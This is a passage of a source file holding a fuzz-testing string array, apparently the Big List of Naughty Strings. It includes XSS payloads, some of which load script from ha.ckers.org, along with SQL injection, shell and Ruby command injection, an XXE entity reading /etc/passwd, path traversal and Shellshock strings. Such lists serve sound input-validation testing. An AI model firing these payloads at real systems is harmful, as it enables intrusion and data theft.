    "<a href=\"\\x1Cjavascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"javascript\\x00:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"javascript\\x3A:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"javascript\\x09:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"javascript\\x0D:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"javascript\\x0A:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "`\"'><img src=xxx:x \\x0Aonerror=javascript:alert(1)>",
    "`\"'><img src=xxx:x \\x22onerror=javascript:alert(1)>",
    "`\"'><img src=xxx:x \\x0Bonerror=javascript:alert(1)>",
    "`\"'><img src=xxx:x \\x0Donerror=javascript:alert(1)>",
    "`\"'><img src=xxx:x \\x2Fonerror=javascript:alert(1)>",
    "`\"'><img src=xxx:x \\x09onerror=javascript:alert(1)>",
    "`\"'><img src=xxx:x \\x0Conerror=javascript:alert(1)>",
    "`\"'><img src=xxx:x \\x00onerror=javascript:alert(1)>",
    "`\"'><img src=xxx:x \\x27onerror=javascript:alert(1)>",
    "`\"'><img src=xxx:x \\x20onerror=javascript:alert(1)>",
    "\"`'><script>\\x3Bjavascript:alert(1)</script>",
    "\"`'><script>\\x0Djavascript:alert(1)</script>",
    "\"`'><script>\\xEF\\xBB\\xBFjavascript:alert(1)</script>",
    "\"`'><script>\\xE2\\x80\\x81javascript:alert(1)</script>",
    "\"`'><script>\\xE2\\x80\\x84javascript:alert(1)</script>",
    "\"`'><script>\\xE3\\x80\\x80javascript:alert(1)</script>",
    "\"`'><script>\\x09javascript:alert(1)</script>",
    "\"`'><script>\\xE2\\x80\\x89javascript:alert(1)</script>",
    "\"`'><script>\\xE2\\x80\\x85javascript:alert(1)</script>",
    "\"`'><script>\\xE2\\x80\\x88javascript:alert(1)</script>",
    "\"`'><script>\\x00javascript:alert(1)</script>",
    "\"`'><script>\\xE2\\x80\\xA8javascript:alert(1)</script>",
    "\"`'><script>\\xE2\\x80\\x8Ajavascript:alert(1)</script>",
    "\"`'><script>\\xE1\\x9A\\x80javascript:alert(1)</script>",
    "\"`'><script>\\x0Cjavascript:alert(1)</script>",
    "\"`'><script>\\x2Bjavascript:alert(1)</script>",
    "\"`'><script>\\xF0\\x90\\x96\\x9Ajavascript:alert(1)</script>",
    "\"`'><script>-javascript:alert(1)</script>",
    "\"`'><script>\\x0Ajavascript:alert(1)</script>",
    "\"`'><script>\\xE2\\x80\\xAFjavascript:alert(1)</script>",
    "\"`'><script>\\x7Ejavascript:alert(1)</script>",
    "\"`'><script>\\xE2\\x80\\x87javascript:alert(1)</script>",
    "\"`'><script>\\xE2\\x81\\x9Fjavascript:alert(1)</script>",
    "\"`'><script>\\xE2\\x80\\xA9javascript:alert(1)</script>",
    "\"`'><script>\\xC2\\x85javascript:alert(1)</script>",
    "\"`'><script>\\xEF\\xBF\\xAEjavascript:alert(1)</script>",
    "\"`'><script>\\xE2\\x80\\x83javascript:alert(1)</script>",
    "\"`'><script>\\xE2\\x80\\x8Bjavascript:alert(1)</script>",
    "\"`'><script>\\xEF\\xBF\\xBEjavascript:alert(1)</script>",
    "\"`'><script>\\xE2\\x80\\x80javascript:alert(1)</script>",
    "\"`'><script>\\x21javascript:alert(1)</script>",
    "\"`'><script>\\xE2\\x80\\x82javascript:alert(1)</script>",
    "\"`'><script>\\xE2\\x80\\x86javascript:alert(1)</script>",
    "\"`'><script>\\xE1\\xA0\\x8Ejavascript:alert(1)</script>",
    "\"`'><script>\\x0Bjavascript:alert(1)</script>",
    "\"`'><script>\\x20javascript:alert(1)</script>",
    "\"`'><script>\\xC2\\xA0javascript:alert(1)</script>",
    "<img \\x00src=x onerror=\"alert(1)\">",
    "<img \\x47src=x onerror=\"javascript:alert(1)\">",
    "<img \\x11src=x onerror=\"javascript:alert(1)\">",
    "<img \\x12src=x onerror=\"javascript:alert(1)\">",
    "<img\\x47src=x onerror=\"javascript:alert(1)\">",
    "<img\\x10src=x onerror=\"javascript:alert(1)\">",
    "<img\\x13src=x onerror=\"javascript:alert(1)\">",
    "<img\\x32src=x onerror=\"javascript:alert(1)\">",
    "<img\\x47src=x onerror=\"javascript:alert(1)\">",
    "<img\\x11src=x onerror=\"javascript:alert(1)\">",
    "<img \\x47src=x onerror=\"javascript:alert(1)\">",
    "<img \\x34src=x onerror=\"javascript:alert(1)\">",
    "<img \\x39src=x onerror=\"javascript:alert(1)\">",
    "<img \\x00src=x onerror=\"javascript:alert(1)\">",
    "<img src\\x09=x onerror=\"javascript:alert(1)\">",
    "<img src\\x10=x onerror=\"javascript:alert(1)\">",
    "<img src\\x13=x onerror=\"javascript:alert(1)\">",
    "<img src\\x32=x onerror=\"javascript:alert(1)\">",
    "<img src\\x12=x onerror=\"javascript:alert(1)\">",
    "<img src\\x11=x onerror=\"javascript:alert(1)\">",
    "<img src\\x00=x onerror=\"javascript:alert(1)\">",
    "<img src\\x47=x onerror=\"javascript:alert(1)\">",
    "<img src=x\\x09onerror=\"javascript:alert(1)\">",
    "<img src=x\\x10onerror=\"javascript:alert(1)\">",
    "<img src=x\\x11onerror=\"javascript:alert(1)\">",
    "<img src=x\\x12onerror=\"javascript:alert(1)\">",
    "<img src=x\\x13onerror=\"javascript:alert(1)\">",
    "<img[a][b][c]src[d]=x[e]onerror=[f]\"alert(1)\">",
    "<img src=x onerror=\\x09\"javascript:alert(1)\">",
    "<img src=x onerror=\\x10\"javascript:alert(1)\">",
    "<img src=x onerror=\\x11\"javascript:alert(1)\">",
    "<img src=x onerror=\\x12\"javascript:alert(1)\">",
    "<img src=x onerror=\\x32\"javascript:alert(1)\">",
    "<img src=x onerror=\\x00\"javascript:alert(1)\">",
    "<a "
    "href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</"
    "a>",
    "<img src=\"x` `<script>javascript:alert(1)</script>\"` `>",
    "<img src onerror /\" '\"= alt=javascript:alert(1)//\">",
    "<title onpropertychange=javascript:alert(1)></title><title title=>",
    "<a href=http://foo.bar/#x=`y></a><img alt=\"`><img src=x:x "
    "onerror=javascript:alert(1)></a>\">",
    "<!--[if]><script>javascript:alert(1)</script -->",
    "<!--[if<img src=x onerror=javascript:alert(1)//]> -->",
    "<script src=\"/\%(jscript)s\"></script>",
    "<script src=\"\\%(jscript)s\"></script>",
    "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
    "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
    "<IMG SRC=# onmouseover=\"alert('xxs')\">",
    "<IMG SRC= onmouseover=\"alert('xxs')\">",
    "<IMG onmouseover=\"alert('xxs')\">",
    "<IMG "
    "SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#"
    "108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
    "<IMG "
    "SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#"
    "0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#"
    "0000116&#"
    "0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>",
    "<IMG "
    "SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#"
    "x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>",
    "<IMG SRC=\"jav   ascript:alert('XSS');\">",
    "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
    "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">",
    "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">",
    "perl -e 'print \"<IMG SRC=java\0script:alert(\"XSS\")>\";' > out",
    "<IMG SRC=\" &#14;  javascript:alert('XSS');\">",
    "<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
    "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>",
    "<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
    "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>",
    "<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >",
    "<SCRIPT SRC=//ha.ckers.org/.j>", "<IMG SRC=\"javascript:alert('XSS')\"",
    "<iframe src=http://ha.ckers.org/scriptlet.html <", "\\\";alert('XSS');//",
    "<u oncopy=alert()> Copy me</u>",
    "<i onwheel=alert(1)> Scroll over me </i>", "<plaintext>",
    "http://a/%%30%30", "</textarea><script>alert(123)</script>",

    //	SQL Injection
    //
    //	Strings which can cause a SQL injection if inputs are not sanitized

    "1;DROP TABLE users", "1'; DROP TABLE users-- 1", "' OR 1=1 -- 1",
    "' OR '1'='1", " ", "%", "_",

    //	Server Code Injection
    //
    //	Strings which can cause user to run code on server as a privileged user
    //(c.f. https://news.ycombinator.com/item?id=7665153)

    "-", "--", "--version", "--help", "$USER",
    "/dev/null; touch /tmp/blns.fail ; echo", "`touch /tmp/blns.fail`",
    "$(touch /tmp/blns.fail)", "@{[system \"touch /tmp/blns.fail\"]}",

    //	Command Injection (Ruby)
    //
    //	Strings which can call system commands within Ruby/Rails applications

    "eval(\"puts 'hello world'\")", "System(\"ls -al /\")", "`ls -al /`",
    "Kernel.exec(\"ls -al /\")", "Kernel.exit(1)", "%x('ls -al /')",

    //      XXE Injection (XML)
    //
    //	String which can reveal system files when parsed by a badly configured
    // XML parser

    "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT "
    "foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",

    //	Unwanted Interpolation
    //
    //	Strings which can be accidentally expanded into different strings if
    // evaluated in the wrong context, e.g. used as a printf format string or
    // via
    // Perl or
    // shell eval. Might expose sensitive data from the program doing the
    // interpolation, or might just represent the wrong string.

    "$HOME", "$ENV{'HOME'}", "%d", "%s", "{0}", "%*.*s", "File:///",

    //	File Inclusion
    //
    //	Strings which can cause user to pull in files that should not be a part
    // of a web server

    "../../../../../../../../../../../etc/passwd%00",
    "../../../../../../../../../../../etc/hosts",

    //	Known CVEs and Vulnerabilities
    //
    //	Strings that test for known vulnerabilities

    "() { 0; }; touch /tmp/blns.shellshock1.fail;",
    "() { _; } >_[$($())] { touch /tmp/blns.shellshock2.fail; }",
    "<<< %s(un='%s') = %u", "+++ATH0",

    //	MSDOS/Windows Special Filenames
    //
    //	Strings which are reserved characters in MSDOS/Windows

    "CON", "PRN", "AUX", "CLOCK$", "NUL", "A:", "ZZ:", "COM1", "LPT1", "LPT2",
    "LPT3", "COM2", "COM3", "COM4",

    //   IRC specific strings
    //
    //   Strings that may occur on IRC clients that make security products freak
    //   out

    "DCC SEND STARTKEYLOGGER 0 0 0",

    //	Scunthorpe Problem
    //
    //	Innocuous strings which may be blocked by profanity filters
    //(https://en.wikipedia.org/wiki/Scunthorpe_problem)

    "Scunthorpe General Hospital", "Penistone Community Church",
    "Lightwater Country Park", "Jimmy Clitheroe", "Horniman Museum",
    "shitake mushrooms", "RomansInSussex.co.uk", "http://www.cum.qc.ca/",
    "Craig Cockburn, Software Specialist", "Linda Callahan",
    "Dr. Herman I. Libshitz", "magna cum laude", "Super Bowl XXX",
    "medieval erection of parapets", "evaluate", "mocha", "expression",
    "Arsenal canal", "classic", "Tyson Gay", "Dick Van Dyke", "basement",

    //	Human injection
    //
    //	Strings which may cause human to reinterpret worldview

    "If you're reading this, you've been in a coma for almost 20 years now. "
    "We're trying a new technique. We don't know where this message will end "
    "up in your "
    "dream, but we hope it works. Please wake up, we miss you.",

    //	Terminal escape codes
    //
    //	Strings which punish the fools who use cat/type on this file

    "Roses are [0;31mred[0m, violets are [0;34mblue. Hope you enjoy "
    "terminal hue",
    "But now...[20Cfor my greatest trick...[8m",
    "The quick brown fox... [Beeeep]",

    //	iOS Vulnerabilities
    //
    //	Strings which crashed iMessage in various versions of iOS

    "Power￙ﾄ￙ﾏ￙ﾄ￙ﾏ￘ﾵ￙ﾑ￘ﾨ￙ﾏ￙ﾄ￙ﾏ￙ﾄ￘"
    "ﾵ"
    "￙"
    "ﾑ"
    "￘"
    "ﾨ"
    "￙"
    "ﾏ"
    "￘"
    "ﾱ"
    "￘"
    "ﾱ"
    "￙ﾋ ￠ﾥﾣ ￠ﾥﾣh ￠ﾥﾣ "
    "￠ﾥﾣ￥ﾆﾗ",
    "￰ﾟﾏﾳ0￰ﾟﾌﾈ￯ﾸﾏ"};

// clang-format on